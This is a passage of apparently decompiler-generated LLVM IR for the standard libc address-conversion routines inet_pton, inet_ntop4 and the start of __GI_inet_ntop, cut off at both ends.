  %v0_805721f99 = phi i32 [ %v1_8057235.pre, %dec_label_pc_805721f ], [ %v6_8057213, %dec_label_pc_8057235.preheader ]
  %v2_8057225 = sub i32 %v0_805721f99, %v0_805722d100
  %v2_8057227 = sub i32 %v2_80570ee, %v0_805722d100
  %v6_8057229 = add i32 %v2_8057225, %v4_8057205
  store i32 %v6_8057229, i32* %eax.global-to-local, align 4
  %v1_805722d = add i32 %v0_805722d100, 1
  store i32 %v1_805722d, i32* @esi, align 4
  %v1_805722e = inttoptr i32 %v6_8057229 to i8*
  %v2_805722e = load i8, i8* %v1_805722e, align 1
  %v3_805722e = zext i8 %v2_805722e to i32
  %v4_805722e = load i32, i32* @edx, align 4
  %v5_805722e = and i32 %v4_805722e, -256
  %v6_805722e = or i32 %v5_805722e, %v3_805722e
  store i32 %v6_805722e, i32* @edx, align 4
  %v3_8057230 = inttoptr i32 %v2_8057227 to i8*
  store i8 %v2_805722e, i8* %v3_8057230, align 1
  %v0_8057232 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057232 = inttoptr i32 %v0_8057232 to i8*
  store i8 0, i8* %v1_8057232, align 1
  %v0_8057235.pre = load i32, i32* @esi, align 4
  %v1_8057235.pre = load i32, i32* @edi, align 4
  %v2_8057235 = inttoptr i32 %v0_8057235.pre to i8*
  %v3_8057235 = inttoptr i32 %v1_8057235.pre to i8*
  %v9_8057237 = icmp sgt i8* %v2_8057235, %v3_8057235
  br i1 %v9_8057237, label %dec_label_pc_805723d.thread, label %dec_label_pc_805721f

dec_label_pc_805723d.thread:                      ; preds = %dec_label_pc_805721f, %dec_label_pc_8057235.preheader
  br label %dec_label_pc_8057243

dec_label_pc_805723d:                             ; preds = %dec_label_pc_8057205
  %v16_805723d = icmp eq i32 %v0_805723d.pre, %v2_80570ee
  %v1_8057241 = icmp eq i1 %v16_805723d, false
  br i1 %v1_8057241, label %dec_label_pc_805726e, label %dec_label_pc_8057243

dec_label_pc_8057243:                             ; preds = %dec_label_pc_805723d.thread, %dec_label_pc_805723d
  store i32 %v2_80570e2, i32* %eax.global-to-local, align 4
  %tmp64 = inttoptr i32 %arg3 to i16*
  %v5_805724f = call i32 @memcpy(i16* %tmp64, i32 %v2_80570e2, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057270

dec_label_pc_805725e:                             ; preds = %dec_label_pc_80570c2
  %v1_805725e = call i32 @__errno_location(i32 %v0_80570b1)
  %v1_8057263 = inttoptr i32 %v1_805725e to i32*
  store i32 97, i32* %v1_8057263, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057270

dec_label_pc_805726e:                             ; preds = %dec_label_pc_805716f, %dec_label_pc_8057166, %dec_label_pc_805712a, %dec_label_pc_8057151, %dec_label_pc_805720c, %dec_label_pc_80571b0, %dec_label_pc_805723d, %dec_label_pc_80571ee, %dec_label_pc_80571a3, %dec_label_pc_805719a, %dec_label_pc_80570fd
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057270

dec_label_pc_8057270:                             ; preds = %dec_label_pc_805725e, %dec_label_pc_8057243, %dec_label_pc_80570cd, %dec_label_pc_805726e
  %v0_8057277 = phi i32 [ -1, %dec_label_pc_805725e ], [ 1, %dec_label_pc_8057243 ], [ %v3_80570d3, %dec_label_pc_80570cd ], [ 0, %dec_label_pc_805726e ]
  store i32 %v0_80570b1, i32* @ebx, align 4
  store i32 %v0_80570b0, i32* @esi, align 4
  store i32 %v0_80570af, i32* @edi, align 4
  store i32 %v0_80570ae, i32* @ebp, align 4
  ret i32 %v0_8057277

; uselistorder directives
  uselistorder i32 %v1_8057235.pre, { 1, 0 }
  uselistorder i32 %v0_8057235.pre, { 1, 0 }
  uselistorder i32 %v0_805722d100, { 2, 1, 0 }
  uselistorder i32 %v0_805723d.pre, { 2, 1, 0 }
  uselistorder i32 %v0_805723d.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_80571d5, { 2, 1, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v1_8057122, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_80570ee, { 0, 2, 1, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_80570b1, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 58, { 0, 6, 2, 3, 4, 5, 1 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8057270, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805726e, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_8057243, { 1, 0 }
  uselistorder label %dec_label_pc_805721f, { 1, 0 }
  uselistorder label %dec_label_pc_8057205, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80571ce, { 1, 0 }
  uselistorder label %dec_label_pc_805718e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80571ce.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %v0_8057279 = load i32, i32* @edi, align 4
  %v0_805727a = load i32, i32* @esi, align 4
  store i32 0, i32* %ebp.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v0_8057282 = load i32, i32* @eax, align 4
  %v3_8057286 = and i32 %v0_8057282, -65536
  store i32 %v3_8057286, i32* %stack_var_-33, align 4
  %v2_8057291 = ptrtoint i32* %stack_var_-31 to i32
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8057297 = load i32, i32* @edx, align 4
  %v5_8057297 = inttoptr i32 %v0_8057297 to i8*
  store i8* %v5_8057297, i8** %stack_var_-60, align 4
  %v0_805729b = load i32, i32* @ecx, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_80572a1 = add i32 %v2_8057291, 4
  store i32 %v6_80572a1, i32* %edi.global-to-local, align 4
  %v2_80572a2 = inttoptr i32 %v6_80572a1 to i32*
  store i32 0, i32* %v2_80572a2, align 4
  %v3_80572a2 = load i32, i32* %edi.global-to-local, align 4
  %v6_80572a2 = add i32 %v3_80572a2, 4
  store i32 %v6_80572a2, i32* %edi.global-to-local, align 4
  %v0_80572a3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80572a3 = inttoptr i32 %v6_80572a2 to i32*
  store i32 %v0_80572a3, i32* %v2_80572a3, align 4
  %v3_80572a3 = load i32, i32* %edi.global-to-local, align 4
  %v6_80572a3 = add i32 %v3_80572a3, 4
  store i32 %v6_80572a3, i32* %edi.global-to-local, align 4
  %v0_80572a4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80572a4 = trunc i32 %v0_80572a4 to i16
  %v3_80572a4 = inttoptr i32 %v6_80572a3 to i16*
  store i16 %v1_80572a4, i16* %v3_80572a4, align 2
  %v4_80572a4 = load i32, i32* %edi.global-to-local, align 4
  %v7_80572a4 = add i32 %v4_80572a4, 2
  store i32 %v7_80572a4, i32* %edi.global-to-local, align 4
  %v0_80572a6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80572a6 = trunc i32 %v0_80572a6 to i8
  %v3_80572a6 = inttoptr i32 %v7_80572a4 to i8*
  store i8 %v1_80572a6, i8* %v3_80572a6, align 1
  %v0_805733626 = load i32, i32* %ebp.global-to-local, align 4
  %v7_805733929 = icmp sgt i32 %v0_805733626, 3
  br i1 %v7_805733929, label %dec_label_pc_805733f, label %dec_label_pc_80572ac

dec_label_pc_80572ac:                             ; preds = %entry, %dec_label_pc_8057314
  %v0_805733630 = phi i32 [ %v0_8057336, %dec_label_pc_8057314 ], [ %v0_805733626, %entry ]
  %v0_80572b0 = load i32, i32* @ecx, align 4
  %v1_80572b0 = and i32 %v0_80572b0, -256
  %v2_80572b0 = or i32 %v1_80572b0, 100
  store i32 %v2_80572b0, i32* %ecx.global-to-local, align 4
  %v2_80572b2 = add i32 %v0_805733630, %v0_8057282
  store i32 %v2_80572b2, i32* %eax.global-to-local, align 4
  %v0_80572b4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80572b4 = add i32 %v0_80572b4, 1
  store i32 %v1_80572b4, i32* @esi, align 4
  store i32 %v0_80572b4, i32* @edi, align 4
  %v1_80572bd = inttoptr i32 %v2_80572b2 to i8*
  %v2_80572bd = load i8, i8* %v1_80572bd, align 1
  %v3_80572bd = zext i8 %v2_80572bd to i32
  %v4_80572bd = load i32, i32* @edx, align 4
  %v5_80572bd = and i32 %v4_80572bd, -65536
  %v6_80572bd = or i32 %v5_80572bd, %v3_80572bd
  store i32 %v6_80572bd, i32* %edx.global-to-local, align 4
  %div = udiv i8 %v2_80572bd, 100
  %v6_80572c3 = zext i8 %div to i32
  %v4_80572c5 = or i32 %v6_80572c3, %v1_80572b0
  store i32 %v4_80572c5, i32* %ecx.global-to-local, align 4
  %v1_80572c7 = or i32 %v4_80572c5, 48
  store i32 %v1_80572c7, i32* %eax.global-to-local, align 4
  %v1_80572ca = trunc i32 %v1_80572c7 to i8
  %v2_80572ca = load i32, i32* @esp, align 4
  %v4_80572ca = add i32 %v0_80572b4, 43
  %v5_80572ca = add i32 %v4_80572ca, %v2_80572ca
  %v6_80572ca = inttoptr i32 %v5_80572ca to i8*
  store i8 %v1_80572ca, i8* %v6_80572ca, align 1
  %v0_80572ce = load i32, i32* %eax.global-to-local, align 4
  %v1_80572ce = trunc i32 %v0_80572ce to i8
  %v7_80572ce = icmp eq i8 %v1_80572ce, 48
  %v1_80572d0 = icmp eq i1 %v7_80572ce, false
  %v0_80572f6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80572f6 = and i32 %v0_80572f6, -256
  %v2_80572f6 = or i32 %v1_80572f6, 10
  store i32 %v2_80572f6, i32* %ecx.global-to-local, align 4
  %v0_80572f8 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80572f8, i32* %eax.global-to-local, align 4
  %v3_80572fa = trunc i32 %v0_80572f8 to i16
  %v5_80572fa = udiv i16 %v3_80572fa, 10
  br i1 %v1_80572d0, label %dec_label_pc_80572f6, label %dec_label_pc_80572d2

dec_label_pc_80572d2:                             ; preds = %dec_label_pc_80572ac
  %v9_80572d6 = and i32 %v0_80572f8, -65536
  %tmp = urem i16 %v5_80572fa, 256
  store i32 10, i32* %ecx.global-to-local, align 4
  %div32 = udiv i16 %tmp, 10
  %v7_80572e3 = zext i16 %div32 to i32
  %v11_80572e3 = or i32 %v7_80572e3, %v9_80572d6
  store i32 %v11_80572e3, i32* %eax.global-to-local, align 4
  %tmp34 = urem i16 %tmp, 10
  %v12_80572e3 = zext i16 %tmp34 to i32
  %v1_80572e6 = or i32 %v12_80572e3, 48
  %v8_80572e6 = trunc i32 %v1_80572e6 to i8
  store i32 %v1_80572e6, i32* %edx.global-to-local, align 4
  %v2_80572e9 = load i32, i32* @esp, align 4
  %v3_80572e9 = load i32, i32* %ebx.global-to-local, align 4
  %v4_80572e9 = add i32 %v2_80572e9, 43
  %v5_80572e9 = add i32 %v4_80572e9, %v3_80572e9
  %v6_80572e9 = inttoptr i32 %v5_80572e9 to i8*
  store i8 %v8_80572e6, i8* %v6_80572e9, align 1
  %v0_80572ed = load i32, i32* %edx.global-to-local, align 4
  %v1_80572ed = trunc i32 %v0_80572ed to i8
  %v7_80572ed = icmp eq i8 %v1_80572ed, 48
  br i1 %v7_80572ed, label %dec_label_pc_8057314, label %dec_label_pc_80572f2

dec_label_pc_80572f2:                             ; preds = %dec_label_pc_80572d2
  %v0_80572f2 = load i32, i32* @esi, align 4
  store i32 %v0_80572f2, i32* @edi, align 4
  br label %dec_label_pc_8057314

dec_label_pc_80572f6:                             ; preds = %dec_label_pc_80572ac
  %tmp35 = urem i16 %v5_80572fa, 256
  %v3_80572fc = and i32 %v0_80572f8, -65536
  store i32 10, i32* %ecx.global-to-local, align 4
  %div33 = udiv i16 %tmp35, 10
  %v7_8057307 = zext i16 %div33 to i32
  %v11_8057307 = or i32 %v7_8057307, %v3_80572fc
  store i32 %v11_8057307, i32* %eax.global-to-local, align 4
  %tmp36 = urem i16 %tmp35, 10
  %v12_8057307 = zext i16 %tmp36 to i32
  %v1_805730a = or i32 %v12_8057307, 48
  %v8_805730a = trunc i32 %v1_805730a to i8
  store i32 %v1_805730a, i32* %edx.global-to-local, align 4
  %v0_805730d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805730d = add i32 %v0_805730d, 2
  store i32 %v1_805730d, i32* @edi, align 4
  %v2_8057310 = load i32, i32* @esp, align 4
  %v3_8057310 = load i32, i32* @esi, align 4
  %v4_8057310 = add i32 %v2_8057310, 43
  %v5_8057310 = add i32 %v4_8057310, %v3_8057310
  %v6_8057310 = inttoptr i32 %v5_8057310 to i8*
  store i8 %v8_805730a, i8* %v6_8057310, align 1
  br label %dec_label_pc_8057314

dec_label_pc_8057314:                             ; preds = %dec_label_pc_80572d2, %dec_label_pc_80572f2, %dec_label_pc_80572f6
  store i32 %v2_80572b2, i32* %edx.global-to-local, align 4
  store i32 10, i32* @ecx, align 4
  %v0_805731d = load i32, i32* @edi, align 4
  %v1_805731d = add i32 %v0_805731d, 2
  store i32 %v1_805731d, i32* %ebx.global-to-local, align 4
  %v0_8057320 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8057320 = add i32 %v0_8057320, 1
  store i32 %v1_8057320, i32* %ebp.global-to-local, align 4
  %v2_8057321 = load i8, i8* %v1_80572bd, align 1
  %v3_8057321 = zext i8 %v2_8057321 to i32
  %v4_8057321 = load i32, i32* %eax.global-to-local, align 4
  %v5_8057321 = and i32 %v4_8057321, -65536
  %v6_8057321 = or i32 %v5_8057321, %v3_8057321
  store i32 %v6_8057321, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8057327 = load i32, i32* @esp, align 4
  %v2_8057327 = add i32 %v0_805731d, 44
  %v3_8057327 = add i32 %v2_8057327, %v0_8057327
  %v4_8057327 = inttoptr i32 %v3_8057327 to i8*
  store i8 46, i8* %v4_8057327, align 1
  %v0_805732c = load i32, i32* @ecx, align 4
  %v1_805732c = load i32, i32* %eax.global-to-local, align 4
  %v2_805732c = urem i32 %v1_805732c, 65536
  %v3_805732c = load i32, i32* %edx.global-to-local, align 4
  %v4_805732c = mul i32 %v3_805732c, 65536
  %v5_805732c = or i32 %v4_805732c, %v2_805732c
  %v6_805732c = urem i32 %v0_805732c, 65536
  %v7_805732c = udiv i32 %v5_805732c, %v6_805732c
  %v8_805732c = urem i32 %v7_805732c, 65536
  %v10_805732c = and i32 %v1_805732c, -65536
  %v11_805732c = or i32 %v8_805732c, %v10_805732c
  store i32 %v11_805732c, i32* %eax.global-to-local, align 4
  %v12_805732c = urem i32 %v5_805732c, %v6_805732c
  %v14_805732c = and i32 %v3_805732c, -65536
  %v15_805732c = or i32 %v12_805732c, %v14_805732c
  %v1_805732f = add i32 %v15_805732c, 48
  %v8_805732f = trunc i32 %v1_805732f to i8
  store i32 %v1_805732f, i32* @edx, align 4
  %v2_8057332 = load i32, i32* @esp, align 4
  %v3_8057332 = load i32, i32* @edi, align 4
  %v4_8057332 = add i32 %v2_8057332, 43
  %v5_8057332 = add i32 %v4_8057332, %v3_8057332
  %v6_8057332 = inttoptr i32 %v5_8057332 to i8*
  store i8 %v8_805732f, i8* %v6_8057332, align 1
  %v0_8057336 = load i32, i32* %ebp.global-to-local, align 4
  %v7_8057339 = icmp sgt i32 %v0_8057336, 3
  br i1 %v7_8057339, label %dec_label_pc_805733f, label %dec_label_pc_80572ac

dec_label_pc_805733f:                             ; preds = %dec_label_pc_8057314, %entry
  %v0_805733f = load i32, i32* @esp, align 4
  %v1_805733f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805733f = add i32 %v0_805733f, 42
  %v3_805733f = add i32 %v2_805733f, %v1_805733f
  %v4_805733f = inttoptr i32 %v3_805733f to i8*
  store i8 0, i8* %v4_805733f, align 1
  %v2_8057347 = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v2_8057347, i32* %ebx.global-to-local, align 4
  %tmp23 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp23, i8** %stack_var_-92, align 4
  %v3_805734c = call i32 @strlen(i8* %tmp23)
  store i32 %v3_805734c, i32* @eax, align 4
  %tmp31 = icmp ugt i32 %v3_805734c, %v0_805729b
  br i1 %tmp31, label %dec_label_pc_805735a, label %dec_label_pc_8057369

dec_label_pc_805735a:                             ; preds = %dec_label_pc_805733f
  %v0_805735a = load i8*, i8** %stack_var_-92, align 4
  %v1_805735a = ptrtoint i8* %v0_805735a to i32
  %v2_805735a = call i32 @__errno_location(i32 %v1_805735a)
  %v1_805735f = inttoptr i32 %v2_805735a to i32*
  store i32 28, i32* %v1_805735f, align 4
  br label %dec_label_pc_8057378

dec_label_pc_8057369:                             ; preds = %dec_label_pc_805733f
  %tmp24 = bitcast i8** %stack_var_-60 to i32*
  %v3_805736c5 = load i32, i32* %tmp24, align 4
  %tmp25 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_805736c5, i32* %tmp25, align 4
  %v0_8057370.cast = inttoptr i32 %v3_805736c5 to i8*
  %v4_8057370 = call i32 @strcpy(i8* %v0_8057370.cast, i32 %v2_8057347)
  br label %dec_label_pc_8057378

dec_label_pc_8057378:                             ; preds = %dec_label_pc_805735a, %dec_label_pc_8057369
  %storemerge = phi i32 [ %v4_8057370, %dec_label_pc_8057369 ], [ 0, %dec_label_pc_805735a ]
  %v0_805737f = phi i32 [ %v4_8057370, %dec_label_pc_8057369 ], [ 0, %dec_label_pc_805735a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805727a, i32* @esi, align 4
  store i32 %v0_8057279, i32* @edi, align 4
  ret i32 %v0_805737f

; uselistorder directives
  uselistorder i32 %v0_8057336, { 1, 0 }
  uselistorder i32 %v3_805732c, { 1, 0 }
  uselistorder i32 %v1_805732c, { 1, 0 }
  uselistorder i32 %v1_805730a, { 1, 0 }
  uselistorder i32 %v1_80572e6, { 1, 0 }
  uselistorder i32 %v0_80572f8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80572c7, { 1, 0 }
  uselistorder i32* %stack_var_-33, { 0, 2, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 7, 5, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 42, { 2, 1, 0 }
  uselistorder i16 10, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8 48, { 2, 3, 12, 14, 4, 5, 6, 9, 8, 7, 10, 0, 11, 1, 13 }
  uselistorder i32 43, { 3, 4, 5, 6, 1, 7, 2, 0 }
  uselistorder i8 100, { 1, 0 }
  uselistorder i32 100, { 5, 1, 3, 4, 2, 0 }
  uselistorder i32 -65536, { 2, 3, 4, 1, 0, 5, 6, 10, 11, 7, 8, 9 }
  uselistorder i1* @df, { 4, 43, 44, 0, 1, 45, 46, 47, 50, 2, 3, 55, 56, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 48, 49, 51, 52, 53, 54 }
  uselistorder label %dec_label_pc_8057378, { 1, 0 }
  uselistorder label %dec_label_pc_8057314, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80572ac, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_8057381 = load i32, i32* @edi, align 4
  %v0_8057382 = load i32, i32* @esi, align 4
  %v0_8057383 = load i32, i32* @ebx, align 4
  %v15_8057384 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_805738b = icmp eq i32 %arg1, 2
  br i1 %v9_805738b, label %dec_label_pc_805739b, label %dec_label_pc_8057390

dec_label_pc_8057390:                             ; preds = %entry
  %v9_8057390 = icmp eq i32 %arg1, 10
  %v1_8057393 = icmp eq i1 %v9_8057390, false
  br i1 %v1_8057393, label %dec_label_pc_8057537, label %dec_label_pc_80573b3

dec_label_pc_805739b:                             ; preds = %entry
  %v4_805739b = ptrtoint i8* %arg3 to i32
  store i32 %v4_805739b, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_80573a7 = call i32 @inet_ntop4(i32 %v0_8057383, i32 %v0_8057382, i32 %v0_8057381)
  store i32 %v3_80573a7, i32* %eax.global-to-local, align 4
  store i32 %v3_80573a7, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057544

dec_label_pc_80573b3:                             ; preds = %dec_label_pc_8057390
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_80573b8 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_80573b8, i32* %eax.global-to-local, align 4
  %tmp43 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp43, i8** %stack_var_-124, align 4
  %v6_80573bd = call i32 @__GI_memset(i8* %tmp43, i32 0, i32 32)
  store i32 %v6_80573bd, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_80573df = add i32 %arg2, 1
  br label %dec_label_pc_80573c9

dec_label_pc_80573c9:                             ; preds = %dec_label_pc_80573c9.dec_label_pc_80573c9_crit_edge, %dec_label_pc_80573b3
  %v1_80573ec = phi i32 [ %v15_8057384, %dec_label_pc_80573b3 ], [ %v1_80573ec.pre, %dec_label_pc_80573c9.dec_label_pc_80573c9_crit_edge ]
  %v0_80573e772 = phi i32 [ 0, %dec_label_pc_80573b3 ], [ %v0_80573f0.pre, %dec_label_pc_80573c9.dec_label_pc_80573c9_crit_edge ]
  %v1_80573d2 = ashr i32 %v0_80573e772, 31
  %v2_80573d3 = zext i32 %v0_80573e772 to i64
  %v4_80573d3 = zext i32 %v1_80573d2 to i64
  %v5_80573d3 = mul nuw i64 %v4_80573d3, 4294967296
  %v6_80573d3 = or i64 %v5_80573d3, %v2_80573d3
  %v8_80573d3 = sdiv i64 %v6_80573d3, 2
  %v9_80573d3 = trunc i64 %v8_80573d3 to i32
  store i32 %v9_80573d3, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_80573d3, i32* %ebx.global-to-local, align 4
  %v2_80573db = add i32 %v0_80573e772, %arg2
  %v3_80573db = inttoptr i32 %v2_80573db to i8*
  %v4_80573db = load i8, i8* %v3_80573db, align 1
  %v5_80573db = zext i8 %v4_80573db to i32
  store i32 %v5_80573db, i32* %eax.global-to-local, align 4
  %v3_80573df = add i32 %v2_80573df, %v0_80573e772
  %v4_80573df = inttoptr i32 %v3_80573df to i8*
  %v5_80573df = load i8, i8* %v4_80573df, align 1
  %v6_80573df = zext i8 %v5_80573df to i32
  store i32 %v6_80573df, i32* %edx.global-to-local, align 4
  %v2_80573e4 = mul nuw nsw i32 %v5_80573db, 256
  %v1_80573e7 = add i32 %v0_80573e772, 2
  store i32 %v1_80573e7, i32* %ecx.global-to-local, align 4
  %v2_80573ea = or i32 %v6_80573df, %v2_80573e4
  store i32 %v2_80573ea, i32* %eax.global-to-local, align 4
  %v3_80573ec = mul i32 %v9_80573d3, 4
  %v4_80573ec = add i32 %v3_80573ec, 60
  %v5_80573ec = add i32 %v4_80573ec, %v1_80573ec
  %v6_80573ec = inttoptr i32 %v5_80573ec to i32*
  store i32 %v2_80573ea, i32* %v6_80573ec, align 4
  %v0_80573f0.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_80573f3 = icmp sgt i32 %v0_80573f0.pre, 15
  br i1 %v7_80573f3, label %dec_label_pc_80573f5, label %dec_label_pc_80573c9.dec_label_pc_80573c9_crit_edge

dec_label_pc_80573c9.dec_label_pc_80573c9_crit_edge: ; preds = %dec_label_pc_80573c9
  %v1_80573ec.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80573c9

dec_label_pc_80573f5:                             ; preds = %dec_label_pc_80573c9
  %v4_80573b3 = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_80573ff.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80573ff

dec_label_pc_80573ff:                             ; preds = %dec_label_pc_80573f5, %dec_label_pc_805742c
  %v0_805742c71 = phi i32 [ 0, %dec_label_pc_80573f5 ], [ %v1_805742c, %dec_label_pc_805742c ]
  %v0_805741770 = phi i32 [ -1, %dec_label_pc_80573f5 ], [ %v0_80574178, %dec_label_pc_805742c ]
  %v0_805743769 = phi i32 [ -1, %dec_label_pc_80573f5 ], [ %v0_805741c9, %dec_label_pc_805742c ]
  %v0_805744268 = phi i32 [ -1, %dec_label_pc_80573f5 ], [ %v0_805742713, %dec_label_pc_805742c ]
  %v2_80573ff = mul nuw nsw i32 %v0_805742c71, 4
  %v3_80573ff = add nuw nsw i32 %v2_80573ff, 60
  %v4_80573ff = add i32 %v3_80573ff, %v0_80573ff.pre
  %v5_80573ff = inttoptr i32 %v4_80573ff to i32*
  %v6_80573ff = load i32, i32* %v5_80573ff, align 4
  %v7_80573ff = icmp eq i32 %v6_80573ff, 0
  %v1_8057404 = icmp eq i1 %v7_80573ff, false
  %v10_8057417 = icmp eq i32 %v0_805741770, -1
  br i1 %v1_8057404, label %dec_label_pc_8057417, label %dec_label_pc_8057406

dec_label_pc_8057406:                             ; preds = %dec_label_pc_80573ff
  %v1_8057409 = icmp eq i1 %v10_8057417, false
  br i1 %v1_8057409, label %dec_label_pc_8057414, label %dec_label_pc_805740b

dec_label_pc_805740b:                             ; preds = %dec_label_pc_8057406
  store i32 %v0_805742c71, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805742c

dec_label_pc_8057414:                             ; preds = %dec_label_pc_8057406
  %v0_8057414 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057414 = add i32 %v0_8057414, 1
  store i32 %v1_8057414, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805742c

dec_label_pc_8057417:                             ; preds = %dec_label_pc_80573ff
  br i1 %v10_8057417, label %dec_label_pc_805742c, label %dec_label_pc_805741c

dec_label_pc_805741c:                             ; preds = %dec_label_pc_8057417
  %v10_805741c = icmp eq i32 %v0_805743769, -1
  %v0_8057425.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057421 = load i32, i32* @ebp, align 4
  %v7_8057423 = icmp sgt i32 %v0_8057425.pre, %v1_8057421
  %or.cond = or i1 %v10_805741c, %v7_8057423
  br i1 %or.cond, label %dec_label_pc_8057425, label %dec_label_pc_8057429

dec_label_pc_8057425:                             ; preds = %dec_label_pc_805741c
  store i32 %v0_8057425.pre, i32* @ebp, align 4
  store i32 %v0_805744268, i32* @edi, align 4
  br label %dec_label_pc_8057429

dec_label_pc_8057429:                             ; preds = %dec_label_pc_805741c, %dec_label_pc_8057425
  %v0_805741c11 = phi i32 [ %v0_805744268, %dec_label_pc_8057425 ], [ %v0_805743769, %dec_label_pc_805741c ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805742c

dec_label_pc_805742c:                             ; preds = %dec_label_pc_8057417, %dec_label_pc_8057414, %dec_label_pc_805740b, %dec_label_pc_8057429
  %v0_805742713 = phi i32 [ %v0_805744268, %dec_label_pc_8057417 ], [ %v0_805744268, %dec_label_pc_8057414 ], [ %v0_805742c71, %dec_label_pc_805740b ], [ -1, %dec_label_pc_8057429 ]
  %v0_80574178 = phi i32 [ -1, %dec_label_pc_8057417 ], [ %v0_805741770, %dec_label_pc_8057414 ], [ %v0_805742c71, %dec_label_pc_805740b ], [ -1, %dec_label_pc_8057429 ]
  %v0_805741c9 = phi i32 [ %v0_805743769, %dec_label_pc_8057417 ], [ %v0_805743769, %dec_label_pc_8057414 ], [ %v0_805743769, %dec_label_pc_805740b ], [ %v0_805741c11, %dec_label_pc_8057429 ]
  %v1_805742c = add nuw nsw i32 %v0_805742c71, 1
